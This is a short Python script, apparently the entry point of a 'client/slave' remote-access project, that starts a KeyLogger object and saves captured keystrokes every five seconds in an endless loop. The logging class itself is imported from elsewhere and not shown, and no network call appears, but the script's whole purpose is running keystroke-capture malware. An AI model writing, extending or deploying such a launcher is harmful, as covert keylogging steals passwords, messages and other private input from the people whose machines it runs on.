from time import sleep

from client.slave.key_logger import KeyLogger

if __name__ == '__main__':
    klgr = KeyLogger()
    klgr.start()

    while True:
        klgr.save()
        sleep(5)
